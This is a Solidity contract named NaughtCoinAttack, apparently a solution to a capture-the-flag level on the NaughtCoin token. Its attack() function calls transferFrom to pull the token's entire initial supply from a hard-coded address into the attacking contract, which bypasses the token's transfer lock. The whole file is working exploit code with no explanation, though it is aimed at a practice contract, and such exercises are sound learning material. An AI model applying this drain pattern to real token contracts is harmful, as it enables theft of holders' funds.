// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import "./NaughtCoin.sol";

contract NaughtCoinAttack {

    NaughtCoin private victimContract;
    constructor (address _victimContractAddress) {
        victimContract = NaughtCoin(_victimContractAddress);
    } 

    function attack() public{
    uint amount = victimContract.INITIAL_SUPPLY();
    victimContract.transferFrom(0x513417e1393a08b6E9D882cafE191086F131d7E1, address(this), amount);
    }
}